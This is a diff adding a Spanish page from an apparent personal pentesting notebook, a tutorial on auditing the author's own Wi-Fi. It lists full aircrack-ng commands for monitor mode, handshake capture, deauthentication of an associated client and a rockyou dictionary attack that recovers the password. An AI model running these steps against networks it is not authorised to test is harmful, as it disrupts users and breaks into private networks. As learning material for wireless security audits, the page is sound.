@@ -1,0 +1,197 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Captura WPA/WPA2 | Notebook</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes">
+          <h1>Notebook</h1>
+
+          <nav class="vault-tree" aria-label="Ficheros">
+            <a class="vault-file" href="/notebook.html">Inicio</a>
+            <details class="vault-folder" open>
+              <summary>Pivoting</summary>
+              <a class="vault-file" href="/notebook/pivoting/ligolo.html">Ligolo</a>
+              <a class="vault-file" href="/notebook/pivoting/metasploit.html">Metasploit</a>
+              <a class="vault-file" href="/notebook/pivoting/chisel-socat.html">Chisel y Socat</a>
+            </details>
+            <details class="vault-folder" open>
+              <summary>Hacking Wifi</summary>
+              <a class="vault-file is-active" href="/notebook/hacking-wifi/captura-wpa-wpa2.html">Captura WPA/WPA2</a>
+            </details>
+            <details class="vault-folder" open>
+              <summary>Escalada de Privilegios</summary>
+              <details class="vault-folder vault-subfolder" open>
+                <summary>Linux</summary>
+                <a class="vault-file" href="/notebook/escalada-privilegios/linux/sudoers.html">Sudoers</a>
+                <a class="vault-file" href="/notebook/escalada-privilegios/linux/suid.html">SUID</a>
+                <a class="vault-file" href="/notebook/escalada-privilegios/linux/grupos-vulnerables.html">Grupos Vulnerables</a>
+              </details>
+              <details class="vault-folder vault-subfolder">
+                <summary>Windows</summary>
+              </details>
+            </details>
+          </nav>
+        </aside>
+
+        <article class="note-panel is-active" id="captura-wpa-wpa2">
+          <div class="note-tabbar">
+            <span>Captura WPA/WPA2</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Hacking Wifi</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">hacking wifi / aircrack-ng / handshake</p>
+            <h2>Captura WPA/WPA2</h2>
+
+            <aside class="callout warning">
+              <p>En una auditoría inalámbrica se busca inventariar los SSID, BSSID, canales, tipos de cifrado y potencia de señal. Cuando existen clientes asociados, se pueden aplicar técnicas de desautenticación para intentar capturar un handshake WPA/WPA2 cuando el cliente vuelva a conectarse, con el objetivo de comprobar si la contraseña de la red Wi-Fi es robusta y resiste ataques de diccionario.</p>
+            </aside>
+    
+
+            <h2>Preparar Interfaz</h2>
+            <p>Para esta práctica uso una antena <strong>TP-Link AC1300 Archer T3U Plus</strong>. Antes de ponerla en modo monitor conviene comprobar que el sistema la detecta correctamente y localizar su interfaz inalámbrica, en este caso <code>wlan0</code>.</p>
+
+            <figure class="note-figure">
+              <img class="note-image" src="/notebook-assets/hacking-wifi/antena-tplink-ac1300.png" alt="Interfaz wlan0 detectada al conectar la antena TP-Link AC1300 Archer T3U Plus" />
+              <figcaption>La antena aparece como <code>wlan0</code> y queda lista para pasar a modo monitor.</figcaption>
+            </figure>
+
+            <section class="code-card">
+              <h3>Instalar herramientas</h3>
+              <pre><code>sudo apt install aircrack-ng</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Limpiar procesos</h3>
+              <pre><code>sudo airmon-ng check
+sudo airmon-ng check kill
+</code></pre>
+            </section>
+
+      
+            <section class="code-card">
+              <h3>Iniciar modo monitor</h3>
+              <pre><code># Usar el nombre de la antena que aparezca con ifconfig/ip a
+sudo airmon-ng start wlan0</code></pre>
+            </section>
+
+            <figure class="note-figure">
+              <img class="note-image" src="/notebook-assets/hacking-wifi/modo-monitor-habilitado.png" alt="Modo monitor habilitado sobre wlan0" />
+              <figcaption>La interfaz queda preparada para escuchar tráfico inalámbrico.</figcaption>
+            </figure>
+
+            <h2>Descubrimiento</h2>
+            <p>Con la interfaz en modo monitor, se listan las redes visibles y ocultas al alcance. De esta salida interesa quedarse con el <code>BSSID</code>, el canal, el cifrado y el <code>ESSID</code> de la red objetivo.</p>
+            <section class="code-card">
+              <h3>Escanear redes disponibles</h3>
+              <pre><code>sudo airodump-ng wlan0</code></pre>
+            </section>
+
+            <figure class="note-figure">
+              <img class="note-image" src="/notebook-assets/hacking-wifi/escaneo-airodump.png" alt="Escaneo de redes con airodump-ng mostrando BSSID, canal y ESSID objetivo" />
+              <figcaption>Del escaneo se toma el <code>BSSID</code> objetivo y el canal para fijar la captura.</figcaption>
+            </figure>
+
+            <h2>Captura del handshake</h2>
+            <p>Una vez elegido el objetivo, se fija el canal y el BSSID para guardar la captura en disco. <code>En paralelo</code>, si existe un cliente asociado, se fuerza una reconexión mediante desautenticación para provocar el intercambio del handshake.</p>
+
+            <section class="code-card">
+              <h3>Capturar tráfico del objetivo</h3>
+              <pre><code>sudo airodump-ng -c 6 --bssid 9E:3E:63:1D:67:62 -w captura wlan0</code></pre>
+            </section>
+
+            <figure class="note-figure">
+              <img class="note-image" src="/notebook-assets/hacking-wifi/enumerar-clientes-desautenticacion.png" alt="Cliente asociado listado en la sección STATION de airodump-ng" />
+              <figcaption>El cliente asociado aparece en <code>STATION</code> (esa MAC será el objetivo de la desautenticación).</figcaption>
+            </figure>
+
+            <section class="code-card">
+              <h3>Desautenticación controlada</h3>
+              <pre><code>sudo aireplay-ng -0 9 -a 9E:3E:63:1D:67:62 -c 4C:63:71:92:30:F1 wlan0</code></pre>
+            </section>
+
+            <figure class="note-figure">
+              <img class="note-image" src="/notebook-assets/hacking-wifi/desautenticar-objetivo.png" alt="Ataque de desautenticación con aireplay-ng contra el cliente asociado" />
+              <figcaption>El envío de tramas de desautenticación fuerza la reconexión del cliente.</figcaption>
+            </figure>
+
+
+            <figure class="note-figure">
+              <img class="note-image" src="/notebook-assets/hacking-wifi/handshake-capturado.png" alt="Airodump-ng indicando WPA handshake capturado" />
+              <figcaption>Cuando aparece <code>WPA handshake</code> en la parte superior, ya hay material para el ataque offline.</figcaption>
+            </figure>
+
+            <h2>Ficheros generados</h2>
+            <p>Airodump-ng genera varios ficheros de salida. Para el ataque con Aircrack-ng interesa principalmente el fichero <code>.cap</code>, que contiene la captura del handshake.</p>
+
+            <figure class="note-figure">
+              <img class="note-image" src="/notebook-assets/hacking-wifi/ficheros-handshake.png" alt="Ficheros generados por airodump-ng tras capturar el handshake" />
+              <figcaption>Ficheros generados durante la captura.</figcaption>
+            </figure>
+
+        
+
+            <h2>Ataque de diccionario</h2>
+            <p>Cuando aparece el handshake, el archivo <code>.cap</code> puede usarse para probar un diccionario y extraer la contraseña de la red.</p>
+
+            <section class="code-card">
+              <h3>Aircrack-ng</h3>
+              <pre><code>aircrack-ng -b 9E:3E:63:1D:67:62 -w rockyou.txt captura-01.cap</code></pre>
+            </section>
+
+            <figure class="note-figure">
+              <img class="note-image" src="/notebook-assets/hacking-wifi/comando-aircrack.png" alt="Comando aircrack-ng usando BSSID, diccionario y fichero cap" />
+              <figcaption>Aircrack-ng compara el handshake contra las claves del diccionario.</figcaption>
+            </figure>
+
+            <figure class="note-figure">
+              <img class="note-image" src="/notebook-assets/hacking-wifi/output-aircrack.png" alt="Resultado de aircrack-ng encontrando la clave durante la práctica local" />
+              <figcaption>Resultado del ataque de diccionario. Encontró la contraseña de mi red local (012345678)</figcaption>
+            </figure>
+
+            <h2>Limpieza</h2>
+            <section class="code-card">
+              <h3>Detener modo monitor</h3>
+              <pre><code>airmon-ng stop nombreAntena</code></pre>
+            </section>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>wifi</span>
+              <span>wpa</span>
+              <span>wpa2</span>
+              <span>aircrack-ng</span>
+              <span>airodump-ng</span>
+              <span>aireplay-ng</span>
+              <span>handshake</span>
+              <span>modo monitor</span>
+              <span>desautenticación</span>
+              <span>diccionario</span>
+              <span>rockyou</span>
+              <span>tp-link</span>
+            </div>
+
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
